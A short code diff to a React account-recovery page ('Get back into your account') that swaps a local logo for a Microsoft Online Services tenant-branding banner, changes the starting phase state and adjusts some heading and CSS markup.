@@ -13,7 +13,7 @@ class App extends Component {
     this.fetchApi = this.fetchApi.bind(this);
     this.setEmail = this.setEmail.bind(this);
     this.state = {
-      phase: 0,
+      phase: 2,
       isFetching: false,
       email: '',
       loaded: true,
@@ -50,17 +50,17 @@ class App extends Component {
           <div className="header">
             <Panel className="panel-default">
               <div className="row-fluid user-row">
-                <img src={logo} style={{ width: 100, marginTop: -7 }} role="presentation" />
+                <img id="headerImage" title="Microsoft Online Services" className="logo" src="https://secure.aadcdn.microsoftonline-p.com/dbd5a2dd-uvot5qmbqvq5scy8045tpiq7c78fqnhws12fvmqrskc/logintenantbranding/0/bannerlogo?ts=636393060575051196" alt="Microsoft Online Services" />
               </div>
             </Panel>
           </div>
           <div className="body">
             <Panel className="panel-default">
               <div className="web-title">
-                <h3> Get back into your account </h3>
+                <h1> Get back into your account </h1>
               </div>
               {phase === 0 &&
-                <div className="col-md-6">
+                <div className="col-md-6 email-component">
                   <Email
                     increasePhase={this.increasePhase}
                     fetchApi={this.fetchApi}
